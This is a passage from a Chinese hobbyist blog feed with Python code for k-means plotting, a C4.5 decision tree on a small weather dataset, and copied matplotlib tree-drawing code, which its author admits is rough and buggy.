class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.colors <span class="keyword">import</span> ListedColormap</span><br><span class="line"><span class="keyword">from</span> kadoya <span class="keyword">import</span> *  <span class="comment">#kmeans算法的py文件名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ori</span><span class="params">(lost_star,new,s,d)</span>:</span></span><br><span class="line">    plt.figure(<span class="number">1</span>)                <span class="comment"># 第一张图</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">      <span class="keyword">if</span> s[i]==d[<span class="number">0</span>]:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'r'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">      <span class="keyword">if</span> s[i]==d[<span class="number">1</span>]:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'b'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">      <span class="keyword">if</span> s[i]==d[<span class="number">2</span>]:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'g'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">    plt.title(<span class="string">'training set'</span>)</span><br><span class="line">    plt.figure(<span class="number">2</span>)                <span class="comment"># 第二张图</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star)):</span><br><span class="line">      <span class="keyword">if</span> int(star[i])==<span class="number">0</span>:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'r'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">      <span class="keyword">if</span> int(star[i])==<span class="number">1</span>:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'b'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">      <span class="keyword">if</span> int(star[i])==<span class="number">2</span>:</span><br><span class="line">        plt.scatter(lost_star[i][<span class="number">0</span>],lost_star[i][<span class="number">1</span>],c = <span class="string">'g'</span>,marker = <span class="string">'o'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(new)):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">            plt.scatter(new[i][<span class="number">0</span>],new[i][<span class="number">1</span>],c = <span class="string">'r'</span>,marker = <span class="string">'x'</span>)</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">            plt.scatter(new[i][<span class="number">0</span>],new[i][<span class="number">1</span>],c = <span class="string">'b'</span>,marker = <span class="string">'x'</span>)</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">2</span>:</span><br><span class="line">            plt.scatter(new[i][<span class="number">0</span>],new[i][<span class="number">1</span>],c = <span class="string">'g'</span>,marker = <span class="string">'x'</span>)</span><br><span class="line">    plt.title(<span class="string">'test set'</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    path = <span class="string">r'data.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    k=<span class="number">3</span></span><br><span class="line">    lost_star,centroids=stardust(data,k)<span class="comment">#拿到数据集和质心</span></span><br><span class="line">    star,new=kmeans(lost_star,centroids)</span><br><span class="line"></span><br><span class="line">    s,d=[],[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        s.append(i.strip(<span class="string">'\n'</span>).split(<span class="string">','</span>)[<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">            d.append(i)</span><br><span class="line">    ori(lost_star,new,s,d)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C4.5的python实现</title>
      <link href="/2018/03/29/%E4%BB%93%E5%BA%93%EF%BC%9AC4-5%E7%9A%84python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2018/03/29/%E4%BB%93%E5%BA%93%EF%BC%9AC4-5%E7%9A%84python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>尝试着写了一下，只是在重复造轮子而已<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>开始后的第三周，尝试着写了一点。<br>edit：于4月8日增加连续值处理，具体参见<a href="https://www.jianshu.com/p/f7219841916a" target="_blank" rel="noopener">https://www.jianshu.com/p/f7219841916a</a><br>edit：4月10日消减部分代码量<br>数据集如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">OUTLOOK TEMPERATURE HUMIDITY WINDY ACTIVATE</span><br><span class="line">sunny 85 85 weak no</span><br><span class="line">sunny 80 90 strong no</span><br><span class="line">overcast 83 78 weak yes</span><br><span class="line">rainy 70 96 weak yes</span><br><span class="line">rainy 68 80 weak yes</span><br><span class="line">rainy 65 70 strong no</span><br><span class="line">overcast 64 65 strong yes</span><br><span class="line">sunny 72 95 weak no</span><br><span class="line">sunny 69 70 weak yes</span><br><span class="line">rainy 75 80 weak yes</span><br><span class="line">sunny 75 70 strong yes</span><br><span class="line">overcast 72 90 strong yes</span><br><span class="line">overcast 81 75 weak yes</span><br><span class="line">rainy 71 80 strong no</span><br></pre></td></tr></table></figure></the></p><p>思路很迷，如果有谁不幸看到了这篇请不要当做参考会被带到沟里的……<br>有1点问题，关于max默认取第一个值……比如两个属性的信息增益率相等且都最大，取不同的属性作为节点会生成不同的树（。<br>所以该怎么办哦www</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">●C4.5 v1.1</span></span><br><span class="line"><span class="string">作者：Kadoya</span></span><br><span class="line"><span class="string">创建日期：18.3.24</span></span><br><span class="line"><span class="string">最近修改时间：18.4.10</span></span><br><span class="line"><span class="string">程序目的：一个树:D</span></span><br><span class="line"><span class="string">主要算法说明：</span></span><br><span class="line"><span class="string">        1.说白了（大概）就是权重排序，或者看下面这一堆废话也行。</span></span><br><span class="line"><span class="string">            读取文档→拿到属性→调stardust()拿到具体数据（列表）→</span></span><br><span class="line"><span class="string">            调continuous()处理连续值→调entropy()拿到结果熵（playgolf?）→</span></span><br><span class="line"><span class="string">            将数据集，属性和结果熵传入gotcha()，即用于找到下一个节点和子集的函数</span></span><br><span class="line"><span class="string">            ①如果结果是纯的或满足某种条件则return（对应书上第2~4行）</span></span><br><span class="line"><span class="string">            ②调gainratio()得到每个属性对应的信息增益率并排序，取最大的作为节点</span></span><br><span class="line"><span class="string">            ③生成基于该属性不同取值的不同子集，计算子集的结果熵并再次调用gotcha()（第11~14行）</span></span><br><span class="line"><span class="string">            返回tree并输出（第15行）</span></span><br><span class="line"><span class="string">        2.凑不齐三点了不管了x</span></span><br><span class="line"><span class="string">程序备注：</span></span><br><span class="line"><span class="string">        1.蜃楼啥时候上steam啊……</span></span><br><span class="line"><span class="string">        2.教授！！！来我迦了！！！毒针地狱.jpg 为了刷毒针正式移民乌鲁克……</span></span><br><span class="line"><span class="string">        3.一人血书医生早日实装（</span></span><br><span class="line"><span class="string">更新历史：</span></span><br><span class="line"><span class="string">        3.28 v1.0</span></span><br><span class="line"><span class="string">            ①基本功能完成，小bug不计其数，智障操作不计其数</span></span><br><span class="line"><span class="string">        4.8 update v1.05</span></span><br><span class="line"><span class="string">            ①增加连续值处理</span></span><br><span class="line"><span class="string">            ②可以引random达到增益率相同时的选择伪随机而非直接[0]选择第一个但是没改</span></span><br><span class="line"><span class="string">        4.10 update v1.1</span></span><br><span class="line"><span class="string">            ①连续值那里原本的int改了float，免得有小数</span></span><br><span class="line"><span class="string">            ②精简部分代码，纯代码部分压缩到80行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">说实话上次好像说了有个bug要改，想不起来了（……</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stardust</span><span class="params">(data)</span>:</span><span class="comment">#具体数据,参数：读到的源文档</span></span><br><span class="line">    attributes=[]<span class="comment">#属性:outlook,temperature,humidity,windy之类</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">0</span>].split(<span class="string">' '</span>)[<span class="number">0</span>:<span class="number">-1</span>]:<span class="comment">#最后一列是结果(play golf?)所以不算</span></span><br><span class="line">        attributes.append(i)          <span class="comment">#拿到所有属性</span></span><br><span class="line">    lost_star=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">1</span>:]:<span class="comment">#第一行是说明所以不算，下一个.jpg</span></span><br><span class="line">        lost_star.append(i.strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>)[<span class="number">0</span>:])<span class="comment">#删除换行符，以空格分割</span></span><br><span class="line">    lost_star=continuous(lost_star,<span class="number">1</span>)</span><br><span class="line">    lost_star=continuous(lost_star,<span class="number">2</span>)</span><br><span class="line">    en = entropy(lost_star,len(lost_star[<span class="number">0</span>])<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> attributes,lost_star,en</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_subset</span><span class="params">(lost_star,value,j)</span>:</span><span class="comment">#生成子集 参数：数据集，属性具体取值,所在列数</span></span><br><span class="line">    subset=[lost_star[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star)) <span class="keyword">if</span> lost_star[i][j]==value]</span><br><span class="line">    <span class="keyword">return</span> subset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continuous</span><span class="params">(lost_star,l)</span>:</span><span class="comment">#连续值的阈值 参数：数据集，连续值所在列数</span></span><br><span class="line">    <span class="comment">#不转float会出现15,7,89这种情况，大概是因为str先比第一位，大概。</span></span><br><span class="line">    gear=sorted(lost_star,key=<span class="keyword">lambda</span> st: float(st[l]))</span><br><span class="line">    <span class="comment">#可能的分割阈值点，!=是因为把取值相同的类分成不同的类没有意义</span></span><br><span class="line"><span class="comment">##    possible=[]</span></span><br><span class="line"><span class="comment">##    for i in range(len(lost_star)):</span></span><br><span class="line"><span class="comment">##        if lost_star[i][-1]!=lost_star[i+1][-1]:</span></span><br><span class="line"><span class="comment">##            possible+=[str((int(lost_star[i][l])+int(lost_star[i+1][l]))/2)]</span></span><br><span class="line"><span class="comment">##            print(possible)</span></span><br><span class="line">    possible=[str((float(gear[i][l])+float(gear[i+<span class="number">1</span>][l]))/<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(gear)<span class="number">-1</span>) <span class="keyword">if</span> gear[i][<span class="number">-1</span>]!=gear[i+<span class="number">1</span>][<span class="number">-1</span>]]</span><br><span class="line">    scrap=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> possible:</span><br><span class="line">        subset1=[gear[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(gear)) <span class="keyword">if</span> float(gear[i][l])&lt;float(j)]<span class="comment">#小于该分割点的子集</span></span><br><span class="line">        subset2=[gear[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(gear)) <span class="keyword">if</span> float(gear[i][l])&gt;=float(j)]<span class="comment">#大于ry</span></span><br><span class="line">        scrap[j]=len(subset1)/len(lost_star)*entropy(subset1,<span class="number">-1</span>)+len(subset2)/len(lost_star)*entropy(subset2,<span class="number">-1</span>)<span class="comment">#计算不同分割点的熵</span></span><br><span class="line">    threshold=[i <span class="keyword">for</span> i,j <span class="keyword">in</span> scrap.items() <span class="keyword">if</span> j == min(scrap.values())][<span class="number">0</span>]<span class="comment">#阈值，增益和熵成反比所以min</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lost_star:</span><br><span class="line">        <span class="comment">#解释一下这个学来的操作，大概就相当于['&gt;=','&lt;'][0 or 1]</span></span><br><span class="line">        <span class="comment">#a cool trick, right? :D</span></span><br><span class="line">        i[l]=[<span class="string">'&gt;='</span>,<span class="string">'&lt;'</span>][float(i[l])&gt;=float(threshold)]+threshold</span><br><span class="line">    <span class="keyword">return</span> lost_star</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entropy</span><span class="params">(lost_star,l)</span>:</span><span class="comment">#计算信息熵  参数：数据集,列数</span></span><br><span class="line">    star=&#123;&#125;</span><br><span class="line">    entropy=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star)):</span><br><span class="line">        <span class="keyword">if</span> lost_star[i][l] <span class="keyword">not</span> <span class="keyword">in</span> star.keys(): <span class="comment">#一个字典</span></span><br><span class="line">            star[lost_star[i][l]]=<span class="number">0</span><span class="comment">#key:value = 结果取值:个数</span></span><br><span class="line">        star[lost_star[i][l]]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> star.values():</span><br><span class="line">        entropy += -(i/sum(star.values()))*log(i/sum(star.values()),<span class="number">2</span>)<span class="comment">#熵，∑-p*log2(p)</span></span><br><span class="line">    <span class="keyword">return</span> entropy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gainratio</span><span class="params">(en,e,j,lost_star)</span>:</span><span class="comment">#信息增益率 参数：结果熵,属性熵,列数,数据集</span></span><br><span class="line">    <span class="keyword">if</span> e == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    entropy_info=<span class="number">0</span> <span class="comment">#属性∑，即∑|Dv|/D * Entropy(playgolf? in Dv)</span></span><br><span class="line">    a_value=set([lost_star[i][j] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star))])<span class="comment">#属性可能的取值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a_value:</span><br><span class="line">        subset=get_subset(lost_star,i,j)<span class="comment">#得到属性取值对应子集</span></span><br><span class="line">        entropy_info += len(subset)/len(lost_star)*entropy(subset,len(subset[<span class="number">0</span>])<span class="number">-1</span>)<span class="comment">#属性∑ = 取值权重*子集熵</span></span><br><span class="line">    <span class="keyword">return</span> (en - entropy_info)/e    <span class="comment">#（结果熵-属性∑）/属性熵 = gainratio</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gotcha</span><span class="params">(lost_star,attributes,en)</span>:</span><span class="comment">#生成树  参数：数据集，属性，结果熵</span></span><br><span class="line">    <span class="keyword">if</span> en == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> lost_star[<span class="number">0</span>][<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> len(lost_star[<span class="number">0</span>])==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star)):</span><br><span class="line">            <span class="keyword">if</span> lost_star[i][<span class="number">-1</span>] <span class="keyword">not</span> <span class="keyword">in</span> star:</span><br><span class="line">                star[lost_star[i][<span class="number">-1</span>]]=<span class="number">0</span></span><br><span class="line">            star[lost_star[i][<span class="number">-1</span>]]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i,j <span class="keyword">in</span> lost_star.items():</span><br><span class="line">            <span class="keyword">if</span> j == max(lost_star.values()):</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">    <span class="comment">#↑如果结果熵是0（结果唯一）或属性只剩一个</span></span><br><span class="line">    dust=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(attributes)):</span><br><span class="line">        dust[attributes[i]]=gainratio(en,entropy(lost_star,i),i,lost_star)<span class="comment">#属性对应信息增益率</span></span><br><span class="line">    <span class="comment">#↓试图压缩行数，写了个智熄操作搞到节点</span></span><br><span class="line">    branch=[i <span class="keyword">for</span> i,j <span class="keyword">in</span> dust.items() <span class="keyword">if</span> j == max(dust.values())][<span class="number">0</span>]</span><br><span class="line">    num=attributes.index(branch)<span class="comment">#得到被选作节点的属性所在列数</span></span><br><span class="line">    <span class="keyword">del</span>(attributes[num])        <span class="comment">#把该属性从属性列表中删除</span></span><br><span class="line">    b_value=set([lost_star[i][num] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lost_star))])<span class="comment">#被选作节点的属性可能的取值</span></span><br><span class="line">    tree=&#123;branch:&#123;&#125;&#125;</span><br><span class="line">    <span class="comment">#写个循环调get_subset拿到属性不同取值对应的子集然后递归</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> b_value:</span><br><span class="line">        subset=get_subset(lost_star,i,num)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> range(len(subset)):</span><br><span class="line">            subset[a].remove(subset[a][num])<span class="comment">#去除被选作节点的属性</span></span><br><span class="line">        entro=entropy(subset,len(subset[<span class="number">0</span>])<span class="number">-1</span>)<span class="comment">#子集的结果熵</span></span><br><span class="line">        subattributes = attributes[:]<span class="comment">#化腐朽为神奇.jpg 如果不备份直接传会炸</span></span><br><span class="line">        tree[branch][i]=gotcha(subset,subattributes,entro)<span class="comment">#拿到下一个节点ry</span></span><br><span class="line">    <span class="keyword">return</span> tree</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    path = <span class="string">r'data.txt'</span></span><br><span class="line">    <span class="keyword">with</span> open(path) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line"></span><br><span class="line">    attributes,lost_star,en = stardust(data)<span class="comment">#拿到属性，具体数据集和结果熵</span></span><br><span class="line">    tree=gotcha(lost_star,attributes,en)</span><br><span class="line">    print(tree)</span><br></pre></td></tr></table></figure><p>图像代码（复制来的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: cp936 -*-  </span><br><span class="line">import matplotlib.pyplot as plt  </span><br><span class="line">from kadoya import *  #c4.5算法的py文件名</span><br><span class="line">decisionNode = dict(boxstyle = &apos;sawtooth&apos;, fc = &apos;0.8&apos;)  </span><br><span class="line">leafNode = dict(boxstyle = &apos;round4&apos;, fc = &apos;0.8&apos;)  </span><br><span class="line">arrow_args = dict(arrowstyle = &apos;&lt;-&apos;)  </span><br><span class="line">  </span><br><span class="line">def plotNode(nodeTxt, centerPt, parentPt, nodeType):  </span><br><span class="line">    createPlot.ax1.annotate(nodeTxt, xy = parentPt, xycoords = &apos;axes fraction&apos;,xytext = centerPt, textcoords = &apos;axes fraction&apos;,va = &apos;center&apos;, ha = &apos;center&apos;, bbox = nodeType, arrowprops = arrow_args)  </span><br><span class="line">  </span><br><span class="line"># 使用文本注解绘制树节点  </span><br><span class="line">def createPlot():  </span><br><span class="line">    fig = plt.figure(1, facecolor = &apos;white&apos;)  </span><br><span class="line">    fig.clf()  </span><br><span class="line">    createPlot.ax1 = plt.subplot(111, frameon = False)  </span><br><span class="line">    plotNode(&apos;a decision node&apos;, (0.5,0.1), (0.1,0.5), decisionNode)  </span><br><span class="line">    plotNode(&apos;a leaf node&apos;, (0.8, 0.1), (0.3,0.8), leafNode)  </span><br><span class="line">    plt.show()  </span><br><span class="line">  </span><br><span class="line">#获取叶子节点数目和树的层数  </span><br><span class="line">def getNumLeafs(myTree):  </span><br><span class="line">    numLeafs = 0  </span><br><span class="line">    #firstStr = myTree.keys()[0]</span><br><span class="line">    firstSides = list(myTree.keys())</span><br><span class="line">    firstStr = firstSides[0]</span><br><span class="line">    secondDict = myTree[firstStr]  </span><br><span class="line">    for key in secondDict.keys():  </span><br><span class="line">        if(type(secondDict[key]).__name__ == &apos;dict&apos;):  </span><br><span class="line">            numLeafs += getNumLeafs(secondDict[key])  </span><br><span class="line">        else: numLeafs += 1  </span><br><span class="line">    return numLeafs  </span><br><span class="line">  </span><br><span class="line">def getTreeDepth(myTree):  </span><br><span class="line">    maxDepth = 0  </span><br><span class="line">    #firstStr = myTree.keys()[0]</span><br><span class="line">    firstSides = list(myTree.keys())</span><br><span class="line">    firstStr = firstSides[0]</span><br><span class="line">    secondDict = myTree[firstStr]  </span><br><span class="line">    for key in secondDict.keys():  </span><br><span class="line">        if(type(secondDict[key]).__name__ == &apos;dict&apos;):  </span><br><span class="line">            thisDepth = 1+ getTreeDepth(secondDict[key])  </span><br><span class="line">        else: thisDepth = 1  </span><br><span class="line">        if thisDepth &gt; maxDepth: maxDepth = thisDepth  </span><br><span class="line">    return maxDepth  </span><br><span class="line">  </span><br><span class="line">#更新createPlot代码以得到整棵树  </span><br><span class="line">def plotMidText(cntrPt, parentPt, txtString):  </span><br><span class="line">    xMid = (parentPt[0]-cntrPt[0])/2.0 + cntrPt[0]  </span><br><span class="line">    yMid = (parentPt[1]-cntrPt[1])/2.0 + cntrPt[1]  </span><br><span class="line">    createPlot.ax1.text(xMid, yMid, txtString, va=&quot;center&quot;, ha=&quot;center&quot;, rotation=30)  </span><br><span class="line">  </span><br><span class="line">def plotTree(myTree, parentPt, nodeTxt):#if the first key tells you what feat was split on  </span><br><span class="line">    numLeafs = getNumLeafs(myTree)  #this determines the x width of this tree  </span><br><span class="line">    depth = getTreeDepth(myTree)  </span><br><span class="line">    #firstStr = myTree.keys()[0]     #the text label for this node should be this</span><br><span class="line">    firstSides = list(myTree.keys())</span><br><span class="line">    firstStr = firstSides[0]</span><br><span class="line">    cntrPt = (plotTree.xOff + (1.0 + float(numLeafs))/2.0/plotTree.totalW, plotTree.yOff)  </span><br><span class="line">    plotMidText(cntrPt, parentPt, nodeTxt)  </span><br><span class="line">    plotNode(firstStr, cntrPt, parentPt, decisionNode)  </span><br><span class="line">    secondDict = myTree[firstStr]  </span><br><span class="line">    plotTree.yOff = plotTree.yOff - 1.0/plotTree.totalD  </span><br><span class="line">    for key in secondDict.keys():  </span><br><span class="line">        if type(secondDict[key]).__name__==&apos;dict&apos;:#test to see if the nodes are dictonaires, if not they are leaf nodes     </span><br><span class="line">            plotTree(secondDict[key],cntrPt,str(key))        #recursion  </span><br><span class="line">        else:   #it&apos;s a leaf node print the leaf node  </span><br><span class="line">            plotTree.xOff = plotTree.xOff + 1.0/plotTree.totalW  </span><br><span class="line">            plotNode(secondDict[key], (plotTree.xOff, plotTree.yOff), cntrPt, leafNode)  </span><br><span class="line">            plotMidText((plotTree.xOff, plotTree.yOff), cntrPt, str(key))  </span><br><span class="line">    plotTree.yOff = plotTree.yOff + 1.0/plotTree.totalD  </span><br><span class="line">#if you do get a dictonary you know it&apos;s a tree, and the first element will be another dict  </span><br><span class="line">  </span><br><span class="line">def createPlot(inTree):  </span><br><span class="line">    fig = plt.figure(1, facecolor=&apos;white&apos;)  </span><br><span class="line">    fig.clf()  </span><br><span class="line">    axprops = dict(xticks=[], yticks=[])  </span><br><span class="line">    createPlot.ax1 = plt.subplot(111, frameon=False, **axprops)    #no ticks  </span><br><span class="line">    #createPlot.ax1 = plt.subplot(111, frameon=False) #ticks for demo puropses   </span><br><span class="line">    plotTree.totalW = float(getNumLeafs(inTree))  </span><br><span class="line">    plotTree.totalD = float(getTreeDepth(inTree))  </span><br><span class="line">    plotTree.xOff = 